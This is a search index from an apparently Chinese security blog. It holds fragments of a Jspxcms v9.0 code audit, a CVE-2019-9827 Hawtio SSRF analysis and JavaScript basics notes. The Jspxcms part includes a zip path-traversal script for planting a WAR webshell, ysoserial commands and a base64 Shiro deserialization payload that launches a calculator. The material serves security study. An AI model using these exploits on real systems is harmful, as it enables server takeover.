[{"categories":["代码审计"],"content":"简介 Jspxcms是灵活的、易扩展的开源网站内容管理系统(java cms,jsp cms)，支持多组织、多站点、独立管理的网站群。 jspxcms v9.0.0的存在SQL注入、文件上传、SSRF、Shiro反序列化等漏洞 ","date":"2024-07-14","objectID":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["代码审计","Java安全","Jspxcms"],"title":"Jspxcms v9.0代码审计","uri":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"环境部署 源码下载路径：下载源码：https://gitee.com/jspxcms/Jspxcms/tree/v9.0.0/ 更换MySQL5为MySQL8（根据自己情况，我之前用的MySQL8）： https://www.ujcms.com/documentation/487.html 访问http://localhost:8080/cmscp/，登录后台，用户名admin，密码为空： ","date":"2024-07-14","objectID":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["代码审计","Java安全","Jspxcms"],"title":"Jspxcms v9.0代码审计","uri":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"SQL注入 根据pom.xml文件可知，这套CMS使用了Hibernate作为数据持久化框架： 在未正确使用Hibernate框架的情况下会产生SQL注入漏洞，可以通过全局搜素“query”快速寻找可能存在的漏洞点。 在Hibernate中，如果使用了占位符（问号?的形式）的方式构造SQL语句，基本可以避免SQL注入: 找了一些没找到sql注入 ","date":"2024-07-14","objectID":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","tags":["代码审计","Java安全","Jspxcms"],"title":"Jspxcms v9.0代码审计","uri":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"文件上传 这个漏洞在文件管理的压缩包上传功能，上传的压缩包会被自动解压，如果我们在压缩包中放入 war 包并配合解压后目录穿越 war 包就会被移动到 tomcat 的 webapps 目录，而 tomcat 会自动解压 war 包。 注意：这里测试需要启动 tomcat 做测试，而不是 IDEA 的 SpringBoot，否则可能无法成功。 将jsp打包为war包： java -cf shell.war .\\shell.jsp 然后将 war 包打包成压缩文件: import zipfile zip = zipfile.ZipFile('test.zip','w',zipfile.ZIP_DEFLATED) with open('shell.war', 'rb') as f: data = f.read() # 加入目录穿越操作，上传目录为src/main/webapp/uploads/users/1，这里因为要穿到webapp目录下，所以穿两层。 # 如果是黑盒审计的话，穿越层数只能遍历尝试了 zip.writestr('../../shell.war',data) zip.close() 这里有个jdk版本的小坑，冰蝎jsp的webshell里用到的base64解密操作适用于jdk1.8及以前， 如果jdk是以后的，得改下jsp websell里的base64操作，不然访问会报500错误。参考https://blog.csdn.net/u010250240/article/details/89945871： 分析漏洞产生的原因，抓取文件上传的请求包： 搜索zip_upload.do 跟进zipUpload()，发现一个解压函数AntZipUtils.unzip(): 继续跟进： 可以看到文件名name没有做任何处理就赋给File文件对象，接着执行到fos.write时shell.war就可以被写入到指定路径了，比如Tomcat的webapp目录。 为什么不直接上传 jsp 文件 getshell 呢？这里借用其他师傅们分析的结论： 试一下，发现响应 404 文件不存在，并且文件路径前加了 /jsp。 通过调试发现 JspDispatcherFilter.java 会对访问的 jsp 文件路径前加 /jsp，这就是不直接上传 jsp 文件 getshell的原因。而我们使用压缩包的方式会将 shell.war 解压到 tomcat 的 webapps 目录，这相当于一个新的网站项目JspDispatcherFilter.java 是管不着的。 ","date":"2024-07-14","objectID":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:0","tags":["代码审计","Java安全","Jspxcms"],"title":"Jspxcms v9.0代码审计","uri":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"SSRF 全局搜索关键字 ","date":"2024-07-14","objectID":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:0","tags":["代码审计","Java安全","Jspxcms"],"title":"Jspxcms v9.0代码审计","uri":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"1 搜索openConnection 优先选择controller层的类，因为可能存在前端参数可控的情况 可以看到有个controller层的类 在src/main/java/com/jspxcms/core/web/back/UploadControllerAbstract.java#ueditorCatchImage()方法下。参数source[]可控，当执行到conn.getContentType().indexOf(“image”) 时就会去请求相应的资源： ctrl+单击方法名，搜索调用ueditorCatchImage()方法的位置，可以看到访问路径为/ueditor，action参数需要等于catchimage： 构造payload触发漏洞，成功触发SSRF： ","date":"2024-07-14","objectID":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:1","tags":["代码审计","Java安全","Jspxcms"],"title":"Jspxcms v9.0代码审计","uri":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"2 直接IDEA搜索敏感函数，找到一处使用了HttpClient.execute()的方法fetchHtml()，它被当前类的另一个fetchHtml()调用： ctrl+单击方法名，找到调用fetchHtml()的方法，发现有四处都在controller中： 但是仅有一处可控前端参数url： 验证： ","date":"2024-07-14","objectID":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:2","tags":["代码审计","Java安全","Jspxcms"],"title":"Jspxcms v9.0代码审计","uri":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"Shiro反序列化 在审计第三方组件的漏洞时，首先需要翻阅pom.xml文件，该文件中记录着这个项目使用的第三方组件及其版本号。 我们可以对所使用的Jspxcms的第三方组件的版本进行版本比对，以判断该版本是否受到已知漏洞的影响。 我们以第三方组件shiro为例，查看pom文件，发现使用了shiro框架，且版本为1.3.2（Shiro 并且版本小于 1.4.2）可以利用 Shiro-721 可以看到Commons-beanutils依赖，版本是1.9.3 ysoserial中的Commons-beanutils利用链不仅需要Commons-beanutils,同时还需要 commons-collections 以及 commons-logging,也就是说需要目标中同时存在这3个第三方库的依赖，这条利用链才有效，Jspxcms正好具备这个条件。 先测试一下是否可用： java -jar ysoserial-all.jar CommonsBeanutils1 \"open -a Calculator\" \u003e /Users/xps/Study/MyCode/JavaCode/JavaSec/Jspxcms-v9.0.0/ser.txt java -jar ysoserial.jar CommonsBeanutils1 \"open -a Calculator\" |base64 输出的字符串放到下面p牛的代码中： package com.jspxcms.core.test; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.PriorityQueue; public class test { public static void main(String[] args) throws Exception{ byte[] code = Base64.getDecoder().decode(\"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqbK/rq+AAAAMgA5CgADACIHADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAdeXNvc2VyaWFsL1B3bmVyODY1Mjc0ODEwOTU5NTgBAB9MeXNvc2VyaWFsL1B3bmVyODY1Mjc0ODEwOTU5NTg7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABA","date":"2024-07-14","objectID":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:6:0","tags":["代码审计","Java安全","Jspxcms"],"title":"Jspxcms v9.0代码审计","uri":"/jspxcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"简介 Hawt Hawtio是一款用于管理Java内容的模块化Web控制台程序。 Hawt Hawtio 2.5.0及之前版本中存在代码问题漏洞。该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题。 ","date":"2024-07-09","objectID":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["代码审计","Hawt Hawtio","SSRF","CVE-2019-9827"],"title":"CVE 2019 9827代码审计","uri":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"环境搭建 源码包下载地址： https://oss.sonatype.org/content/repositories/public/io/hawt/hawtio-default/2.5.0/hawtio-default-2.5.0.war 通过tomcat部署： 去tomcat的后台，然后选择WAR file to deply栏目，点击选择hawtio-default-2.5.0.war上传，最后deplay部署即可： 布置以后，会出现布置好的应用，点击应用进入即可： ","date":"2024-07-09","objectID":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["代码审计","Hawt Hawtio","SSRF","CVE-2019-9827"],"title":"CVE 2019 9827代码审计","uri":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"漏洞分析 源码获取方式： 可以通过反编译获取本程序的源码， 或者通过 github 的 tree 分支来获取源码。 先测试一下漏洞点： http://127.0.0.1:8080/hawtio-default-2.5.0/proxy/http://localhost:7777/1.txt hawtio-system-2.5.0.jar直接反编译 通过漏洞描述可以看出问题出现在proxy，所以直接搜索ProxyServlet之类的字眼 找到相关文件：hawtio-system/src/main/java/io/hawt/web/proxy/ProxyServlet.java 从service方法开始分析 protected void service(HttpServletRequest servletRequest, HttpServletResponse servletResponse) throws ServletException, IOException { ProxyAddress proxyAddress = this.parseProxyAddress(servletRequest); if (proxyAddress != null \u0026\u0026 proxyAddress.getFullProxyUrl() != null) { if (proxyAddress instanceof ProxyDetails) { ProxyDetails details = (ProxyDetails)proxyAddress; if (!this.whitelist.isAllowed(details)) { LOG.debug(\"Rejecting {}\", proxyAddress); ServletHelpers.doForbidden(servletResponse, ForbiddenReason.HOST_NOT_ALLOWED); return; } } String method = servletRequest.getMethod(); String proxyRequestUri = proxyAddress.getFullProxyUrl(); URI targetUriObj; try { targetUriObj = new URI(proxyRequestUri); } catch (URISyntaxException var25) { LOG.error(\"URL '{}' is not valid: {}\", proxyRequestUri, var25.getMessage()); servletResponse.setStatus(404); return; } Object proxyRequest; if (servletRequest.getHeader(\"Content-Length\") == null \u0026\u0026 servletRequest.getHeader(\"Transfer-Encoding\") == null) { proxyRequest = new BasicHttpRequest(method, proxyRequestUri); } else { HttpEntityEnclosingRequest eProxyRequest = new BasicHttpEntityEnclosingRequest(method, proxyRequestUri); eProxyRequest.setEntity(new InputStreamEntity(servletRequest.getInputStream(), (long)servletRequest.getContentLength())); proxyRequest = eProxyRequest; } this.copyRequestHeaders(servletRequest, (HttpRequest)proxyRequest, targetUriObj); String username = proxyAddress.getUserName(); String password = proxyAddress.getPassword(); if (Strings.isNotBlank(username) \u0026\u0026 Strings.isNotBlank(password)) { String encodedCreds = Base64.encodeBase64String((username + \":\" + password).getBytes()); ((HttpRequest)proxyRequest).setHeader(\"Authorization\", \"Basic \" + encodedCreds); } Header proxyAuthHeader = ((HttpRequest)proxyRequest).getFirstHeader(\"Authorization\"); if (proxyAuthHeader != null) { String proxyAuth = proxyAuthHeader.getValue(); HttpSession session = servletRequest.getSession(); if (session != null) { String previousProxyCredentials = (String)session.getAttribute(\"proxy-credentials\"); if (previousProxyCredentials != null \u0026\u0026 !previousProxyCredentials.equals(proxyAuth)) { this.cookieStore.clear(); } session.setAttribute(\"proxy-credentials\", proxyAuth); } } this.setXForwardedForHeader(servletRequest, (HttpRequest)proxyRequest); CloseableHttpResponse proxyResponse = null; int statusCode = 0; try { if (this.doLog) { this.log(\"proxy \" + method + \" uri: \" + servletRequest.getRequestURI() + \" -- \" + ((HttpRequest)proxyRequest).getRequestLine().getUri()); } LOG.debug(\"proxy {} uri: {} -- {}\", new Object[]{method, servletRequest.getRequestURI(), ((HttpRequest)proxyRequest).getRequestLine().getUri()}); proxyResponse = this.proxyClient.execute(URIUtils.extractHost(targetUriObj), (HttpRequest)proxyRequest); statusCode = proxyResponse.getStatusLine().getStatusCode(); if (statusCode != 401 \u0026\u0026 statusCode != 403) { if (this.doResponseRedirectOrNotModifiedLogic(servletRequest, servletResponse, proxyResponse, statusCode, targetUriObj)) { return; } } else { if (this.doLog) { this.log(\"Authentication Failed on remote server \" + proxyRequestUri); } LOG.debug(\"Authentication Failed on remote server {}\", proxyRequestUri); } servletResponse.setStatus(statusCode, proxyResponse.getStatusLine().getReasonPhrase()); this.copyResponseHeaders(proxyResponse, servletResponse); this.copyResponseEntity(proxyResponse, servletResponse); } catch (Exception var26) { if (proxyRequest instanceof AbortableHttpRequest) { AbortableHttpRequest abortableHttpRequest = (AbortableHttpRequest)proxyRequest; abortableHttpRequest.abort(); } LOG.debug(\"Proxy to \" + proxyRequestUri + \" failed\", var26); if (!(var26 instanceof ConnectExcep","date":"2024-07-09","objectID":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:3:0","tags":["代码审计","Hawt Hawtio","SSRF","CVE-2019-9827"],"title":"CVE 2019 9827代码审计","uri":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"修复方案 未经验证的用户禁止访问该页面。 ","date":"2024-07-09","objectID":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:4:0","tags":["代码审计","Hawt Hawtio","SSRF","CVE-2019-9827"],"title":"CVE 2019 9827代码审计","uri":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["代码审计"],"content":"参考 https://xz.aliyun.com/t/7186 https://hackerqwq.github.io/2021/11/10/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-SSRF/#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9827 https://github.com/hawtio/hawtio/compare/hawtio-2.5.0...hawtio-2.9.1 https://github.com/hawtio/hawtio/tree/hawtio-2.5.0/ ","date":"2024-07-09","objectID":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:5:0","tags":["代码审计","Hawt Hawtio","SSRF","CVE-2019-9827"],"title":"CVE 2019 9827代码审计","uri":"/cve-2019-9827%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["编程"],"content":"简介 JavaScript 是一门跨平台、面向对象的脚本语言，而Java语言也是跨平台的、面向对象的语言，只不过Java是编译语言，是需要编译成字节码文件才能运行的；JavaScript是脚本语言，不需要编译，由浏览器直接解析并执行。JavaScript 是用来控制网页行为的，它能使网页可交互。 JavaScript（简称：JS） 在 1995 年由 Brendan Eich 发明，并于 1997 年成为一部 ECMA 标准。ECMA 规定了一套标准 就叫 ECMAScript ，所有的客户端校验语言必须遵守这个标准，当然 JavaScript 也遵守了这个标准。ECMAScript 6 (简称ES6) 是最新的 JavaScript 版本（发布于 2015 年)。 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"JavaScript引入方式 JavaScript 引入方式就是 HTML 和 JavaScript 的结合方式。JavaScript引入方式有两种： 内部脚本：将 JS代码定义在HTML页面中 外部脚本：将 JS代码定义在外部 JS文件中，然后引入到 HTML页面中 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"1 内部脚本 在 HTML 中，JavaScript 代码必须位于 \u003cscript\u003e 与 \u003c/script\u003e 标签之间 代码如下： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eTitle\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript\u003e alert(\"hello js\"); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e HTML 文档中可以在任意地方，放置任意数量的","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:1","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"2 外部脚本 第一步：定义外部 js 文件。如定义名为 demo.js的文件 demo.js 文件内容如下： alert(\"hello js\"); 外部脚本不能包含 \u003cscript\u003e 标签，在js文件中直接写 js 代码即可，不要在 js文件 中写 script 标签 第二步：在页面中引入外部的js文件 在页面使用 script 标签中使用 src 属性指定 js 文件的 URL 路径。 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003ctitle\u003eTitle\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cscript src=\"../js/demo.js\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:2","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"基础语法 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"书写语法 区分大小写：与 Java 一样，变量名、函数名以及其他一切东西都是区分大小写的 每行结尾的分号可有可无。如果一行上写多个语句时，必须加分号用来区分多个语句。 注释 单行注释：// 注释内容 多行注释：/* 注释内容 */ 输出语句： 使用 window.alert() 写入警告框 使用 document.write() 写入 HTML 输出 使用 console.log() 写入浏览器控制台 ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:1","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"变量 JavaScript 中用 var 关键字（variable 的缩写）来声明变量。格式 var 变量名 = 数据值;。而在JavaScript 是一门弱类型语言，变量可以存放不同类型的值；如下在定义变量时赋值为数字数据，还可以将变量的值改为字符串类型的数 var test = 20; test = \"张三\"; js 中的变量名命名也有如下规则，和java语言基本都相同 组成字符可以是任何字母、数字、下划线（_）或美元符号（$） 数字不能开头 建议使用驼峰命名 JavaScript 中 var 关键字有点特殊，有以下地方和其他语言不一样 作用域：全局变量 { var age = 20; } alert(age); // 在代码块中定义的age 变量，在代码块外边还可以使用 变量可以重复定义 { var age = 20; var age = 30;//JavaScript 会用 30 将之前 age 变量的 20 替换掉 } alert(age); //打印的结果是 30 针对如上的问题，ECMAScript 6 新增了 let 关键字来定义变量。它的用法类似于 var，但是所声明的变量，只在 let 关键字所在的代码块内有效，且不允许重复声明。 例如： { let age = 20; } alert(age); 如果定义在作用范围之外，通过 F12 打开开发者模式可以看到如下错误信息： 如果重复定义，在IDE报错直接： 同时，ECMAScript 6 新增了 const关键字，用来声明一个只读的常量。一旦声明，常量的值就不能改变。 const PI = 3.14; PI = 3; ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:2","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"数据类型 JavaScript 中提供了两类数据类型：原始类型 和 引用类型。 使用 typeof 运算符可以获取数据类型 alert(typeof age); 以弹框的形式将 age 变量的数据类型输出 原始数据类型： number：数字（整数、小数、NaN(Not a Number)） var age = 20; var price = 99.8; alert(typeof age); // 结果是 ： number alert(typeof price);// 结果是 ： number ==注意：== NaN是一个特殊的number类型的值，后面用到再说 string：字符、字符串，单双引皆可 var ch = 'a'; var name = '张三'; var addr = \"北京\"; alert(typeof ch); //结果是 string alert(typeof name); //结果是 string alert(typeof addr); //结果是 string 注意：在 js 中 双引号和单引号都表示字符串类型的数据 boolean：布尔。true，false var flag = true; var flag2 = false; alert(typeof flag); //结果是 boolean alert(typeof flag2); //结果是 boolean null：对象为空 var obj = null; alert(typeof obj);//结果是 object 为什么打印上面的 obj 变量的数据类型，结果是object；这个官方给出了解释，下面是从官方文档截的图 undefined：当声明的变量未初始化时，该变量的默认值是 undefined var a ; alert(typeof a); //结果是 undefined ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:3","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"运算符 JavaScript 提供了如下的运算符。大部分和Java都是一样的，不同的是 JS 关系运算符中的 == 和 ===，一会我们只演示这两个的区别，其他运算符将不做演示 一元运算符：++，– 算术运算符：+，-，*，/，% 赋值运算符：=，+=，-=… 关系运算符：\u003e，\u003c，\u003e=，\u003c=，!=，==，===… 逻辑运算符：\u0026\u0026，||，! 三元运算符：条件表达式 ? true_value : false_value ==和===区别 概述: ==： 判断类型是否一样，如果不一样，则进行类型转换 再去比较其值 ===：js 中的全等于 判断类型是否一样，如果不一样，直接返回false 再去比较其值 代码： var age1 = 20; var age2 = \"20\"; alert(age1 == age2);// true alert(age1 === age2);// false 类型转换 其他类型转为number string 转换为 number 类型：按照字符串的字面值，转为数字。如果字面值不是数字，则转为NaN 将 string 转换为 number 有两种方式： 使用 + 正号运算符： var str = +\"20\"; alert(str + 1) //21 使用 parseInt() 函数(方法)： var str = \"20\"; alert(parseInt(str) + 1); 建议使用 parseInt() 函数进行转换 boolean 转换为 number 类型：true 转为1，false转为0 var flag = +false; alert(flag); // 0 其他类型转为boolean number 类型转换为 boolean 类型：0和NaN转为false，其他的数字转为true string 类型转换为 boolean 类型：空字符串转为false，其他的字符串转为true null类型转换为 boolean 类型是 false undefined 转换为 boolean 类型是 false 代码如下： // var flag = 3; // var flag = \"\"; var flag = undefined; if(flag){ alert(\"转为true\"); }else { alert(\"转为false\"); } 使用场景： 在 Java 中使用字符串前，一般都会先判断字符串不是null，并且不是空字符才会做其他的一些操作，JavaScript也有类型的操作，代码如下： var str = \"abc\"; //健壮性判断 if(str != null \u0026\u0026 str.length \u003e 0){ alert(\"转为true\"); }else { alert(\"转为false\"); } 但是由于 JavaScript 会自动进行类型转换，所以上述的判断可以进行简化，代码如下： var str = \"abc\"; //健壮性判断 if(str){ alert(\"转为true\"); }else { alert(\"转为false\"); } ","date":"2024-07-08","objectID":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:4","tags":["JavaScript","编程基础","前端"],"title":"JavaScript基础学习笔记","uri":"/javascript%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["编程"],"content":"流程控制语句 JavaScript 中提供了和 Java 一样的流程控制语句，如下 if switch for while dowhile if 语句 var count = 3; if (count == 3) { alert(count); } switch 语句 var num = 3; switch (num) { case 1: alert(\"星期一\"); break; case 2: alert(\"星期二\"); break; case 3: alert(\"星期三\"); break; case 4: alert(\"星期四\"); break; case 5: alert(\"星期五\"); break; case 6: alert(\"星期六\"); break; case 7: alert(\"星期日\"); break; default: alert(\"输入的星期有误\"); break; } for 循环语句 var sum = 0; for (let i = 1; i \u003c= 100; i++) { //建议for循环小括号中定义的变量使用let sum += i; } alert(sum); while 循环语句 var sum = 0; var i = 1; while (i \u003c= 100) { sum += i; i++; } alert(sum); do while 